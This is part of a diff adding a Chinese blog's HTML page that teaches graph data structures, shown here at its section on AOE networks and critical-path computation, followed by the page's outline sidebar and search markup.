+</span></span></span><span class="line"><span class="cl">    <span class="nf">print</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>                      <span class="c1">// 看过来，就只是改了这里 ！！
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="69-关键路径">6.9 关键路径</h2>
+<h3 id="691-aoe-网">6.9.1 AOE 网</h3>
+<p><strong>AOE 网</strong> (Activity On Edge NetWork, 用边表示活动的网)：
+AOE 网的边上带有权值，代表活动及其持续时间，而顶点代表事件（像事件型触发器）。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224201136505.png" alt="AOE网">
+在 AOE 网中，通常只有一个入度为 0 的顶点，称为<strong>开始顶点（源点）</strong>，表示整个工程的起点；同样仅有一个入度为 0 的顶点，称为<strong>结束顶点（汇点）</strong>，表示整个工程的终点。</p>
+<h3 id="692-关键路径的概念">6.9.2 关键路径的概念</h3>
+<p>以一个简单的 AOE 图来说明什么是关键路径。如图所示：
+<strong>完成整个工程的最短时间等于关键路径的长度，关键路径上的活动被称为关键活动，关键活动决定工程的总工期。</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260224192503306.png" alt="关键路径示意"></p>
+<h3 id="693-关键路径的求解">6.9.3 关键路径的求解</h3>
+<p>知晓活动的最早和最迟开始时间才能求出时间余量，进而才能求出关键路径。而活动的最早和最迟开始时间与事件的最早和最迟开始时间密切相关。那么<strong>求解关键路径的流程</strong>如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">事件的最早发生时间（拓扑排序）</span>
+</span></span><span class="line"><span class="cl">                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="n">________________</span><span class="o">|</span> <span class="nf">Vl</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">=</span><span class="nf">Ve</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1">//假设汇点是V6 
+</span></span></span><span class="line"><span class="cl"><span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">事件的最迟发生时间（逆拓扑排序）</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">活动的最早</span><span class="o">/</span><span class="err">最晚发生时间</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl">      <span class="err">时间余量</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl">         <span class="o">|</span>
+</span></span><span class="line"><span class="cl">      <span class="err">关键路径</span>
+</span></span></code></pre></div><p>各流程步骤示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224201348938.png" alt="事件的最早发生时间">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224201646482.png" alt="事件的最迟发生时间">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224203128370.png" alt="活动的最早发生时间">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224203001619.png" alt="活动的最迟发生时间">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224203350524.png" alt="关键路径结果"></p>
+<h3 id="694-关键活动路径的特性">6.9.4 关键活动、路径的特性</h3>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260224204419424.png" alt="特性1">
+<img src="http://tuchuang.mrlxl.cn/picture/20260224204226003.png" alt="特性2"></p>
+<h1 id="附言">附言</h1>
+<p>好多图啊，涉及文章链接如下：
+《数据结构之栈、队列和数组与串》：http://mrlxl.cn/index.php/2026/02/12/test-12/</p>
+
+    </article>
+    <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">总是在探索未知</p>
+
+  </div>
+  <div class="sidebar-right">
+    <h3>大纲</h3>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#数据结构之图">数据结构之图</a></li>
+    <li><a href="#第六章_图">第六章_图</a>
+      <ul>
+        <li><a href="#61-图的基本概念">6.1 图的基本概念</a></li>
+        <li><a href="#62-图的基本术语">6.2 图的基本术语</a>
+          <ul>
+            <li><a href="#621-有向图和无向图">6.2.1 有向图和无向图</a></li>
+            <li><a href="#622-简单图和多重图">6.2.2 简单图和多重图</a></li>
+            <li><a href="#623-顶点">6.2.3 顶点</a></li>
+            <li><a href="#624-边的权带权图--网">6.2.4 边的权，带权图 / 网</a></li>
+            <li><a href="#625-点与点间的关系">6.2.5 点与点间的关系</a>
+              <ul>
+                <li><a href="#6251-一堆描述">6.2.5.1 一堆描述</a></li>
+                <li><a href="#6252-连通图与强连通图">6.2.5.2 连通图与强连通图</a></li>
+              </ul>
+            </li>
+            <li><a href="#626-图的局部">6.2.6 图的局部</a>
+              <ul>
+                <li><a href="#6261-子图">6.2.6.1 子图</a></li>
+                <li><a href="#6262-连通分量与强连通分量">6.2.6.2 连通分量与强连通分量</a></li>
+                <li><a href="#6263-生成树和生成森林">6.2.6.3 生成树和生成森林</a></li>
+              </ul>
+            </li>
+            <li><a href="#627-几种特殊的图">6.2.7 几种特殊的图</a>
+              <ul>
+                <li><a href="#6271-完全图">6.2.7.1 完全图</a></li>
+                <li><a href="#6272-稀疏图与稠密图">6.2.7.2 稀疏图与稠密图</a></li>
+                <li><a href="#6273-有向树">6.2.7.3 有向树</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#63-图的存储结构">6.3 图的存储结构</a>
+          <ul>
+            <li><a href="#631-邻接矩阵法">6.3.1 邻接矩阵法</a></li>
+            <li><a href="#632-邻接表法">6.3.2 邻接表法</a></li>
+            <li><a href="#633-十字链表">6.3.3 十字链表</a></li>
+            <li><a href="#634-邻接多重表">6.3.4 邻接多重表</a></li>
+          </ul>
+        </li>
+        <li><a href="#64-图的基本操作">6.4 图的基本操作</a></li>
+        <li><a href="#65-图的遍历">6.5 图的遍历</a>
+          <ul>
+            <li><a href="#651-图的广度优先遍历">6.5.1 图的广度优先遍历</a>
+              <ul>
+                <li><a href="#6511-概念及实现">6.5.1.1 概念及实现</a></li>
+                <li><a href="#6512-性能分析">6.5.1.2 性能分析</a></li>
+                <li><a href="#6513-广度优先生成树">6.5.1.3 广度优先生成树</a></li>
+                <li><a href="#6514-广度优先生成森林">6.5.1.4 广度优先生成森林</a></li>
+              </ul>
+            </li>
+            <li><a href="#652-图的深度优先遍历">6.5.2 图的深度优先遍历</a>
+              <ul>
+                <li><a href="#6521-概念及实现">6.5.2.1 概念及实现</a></li>
+                <li><a href="#6522-性能分析">6.5.2.2 性能分析</a></li>
+                <li><a href="#6523-深度优先生成树">6.5.2.3 深度优先生成树</a></li>
+                <li><a href="#6524-深度优先生成森林">6.5.2.4 深度优先生成森林</a></li>
+              </ul>
+            </li>
+            <li><a href="#653-图的遍历和图的连通性">6.5.3 图的遍历和图的连通性</a></li>
+          </ul>
+        </li>
+        <li><a href="#66-最小生成树最小代价树">6.6 最小生成树（最小代价树）</a>
+          <ul>
+            <li><a href="#661-最小生成树的概念">6.6.1 最小生成树的概念</a></li>
+            <li><a href="#662-最小生成树算法">6.6.2 最小生成树算法</a>
+              <ul>
+                <li><a href="#6621-prim-算法">6.6.2.1 Prim 算法</a></li>
+                <li><a href="#6622-kruskal-算法">6.6.2.2 Kruskal 算法</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#67-最短路径">6.7 最短路径</a>
+          <ul>
+            <li><a href="#671-最短路径_bfs">6.7.1 最短路径_BFS</a></li>
+            <li><a href="#672-最短路径_dijkstra">6.7.2 最短路径_Dijkstra</a></li>
+            <li><a href="#673-最短路径_floyd">6.7.3 最短路径_Floyd</a></li>
+          </ul>
+        </li>
+        <li><a href="#68-有向无环图描述表达式">6.8 有向无环图描述表达式</a></li>
+        <li><a href="#68-拓扑排序">6.8 拓扑排序</a>
+          <ul>
+            <li><a href="#681-aov-网">6.8.1 AOV 网</a></li>
+            <li><a href="#682-拓扑排序">6.8.2 拓扑排序</a></li>
+            <li><a href="#683-逆拓扑排序">6.8.3 逆拓扑排序</a></li>
+          </ul>
+        </li>
+        <li><a href="#69-关键路径">6.9 关键路径</a>
+          <ul>
+            <li><a href="#691-aoe-网">6.9.1 AOE 网</a></li>
+            <li><a href="#692-关键路径的概念">6.9.2 关键路径的概念</a></li>
+            <li><a href="#693-关键路径的求解">6.9.3 关键路径的求解</a></li>
+            <li><a href="#694-关键活动路径的特性">6.9.4 关键活动、路径的特性</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#附言">附言</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+  </main>
+  
+  
+  <div id="search-modal" class="search-modal">
+    <div class="search-modal-content">
+      
+      <div class="mobile-search-header" style="display: none;">
+        <button id="mobile-exit-btn" class="mobile-icon-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        </button>
+      </div>
+
+      <div class="search-input-wrapper">
+        <input type="text" id="search-input" placeholder="搜索文章标题或内容...">
+        <button id="mobile-search-btn" class="mobile-icon-btn mobile-search-submit" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        </button>
+        <span class="search-loading" style="display: none;">第一次加载搜索功能可能需要一点时间...</span>
+      </div>
+      <div id="search-results" class="search-results"></div>
+      <div class="search-footer">
+        <span class="desktop-only">ESC 关闭</span>
+        <span class="desktop-only">↑↓ 选择</span>
+        <span class="desktop-only">Enter 跳转</span>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';
+
+  mermaid.initialize({ 
+    startOnLoad: false,
+    theme: document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default',
+    securityLevel: 'loose'
+  });
+
+  document.addEventListener('DOMContentLoaded', async () => {
+    
+    await mermaid.run({
+      querySelector: '.mermaid'
+    });
+  });
+</script>
+
+</body>
+</html>
